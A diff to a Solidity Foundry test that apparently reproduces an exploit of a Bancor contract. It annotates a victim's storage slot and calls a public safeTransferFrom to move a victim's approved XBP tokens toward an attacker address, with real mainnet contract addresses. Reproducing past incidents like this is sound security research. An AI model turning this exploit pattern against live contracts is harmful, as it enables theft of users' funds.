@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.10;
+// pragma solidity 0.8.10;
 
 import "forge-std/Test.sol";
 // import "./../interface.sol";
@@ -32,8 +32,13 @@ interface IERC20 {
 }
 
 interface IBancor {
+    // from is victim
     function safeTransferFrom(IERC20 _token, address _from, address _to, uint256 _value) external;
 }
+
+// victim's slot is:
+// Loading from addr LitAddr 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40 slot Lit 0xab39bd4ed4f120ab16b799b542a9f20cadc701e31bfb4bc86052bf201b781ebc
+// Fetching slot 0xab39bd4ed4f120ab16b799b542a9f20cadc701e31bfb4bc86052bf201b781ebc at 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40
 
 contract BancorExploit is Test {
     address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
@@ -52,7 +57,7 @@ contract BancorExploit is Test {
         XBPToken.balanceOf(victim);
         uint256 balBefore = XBPToken.balanceOf(attacker);
 
-        vm.prank(address(this));
+        // vm.prank(address(this));
         bancorContract.safeTransferFrom(
             IERC20(address(XBPToken)),
             victim,
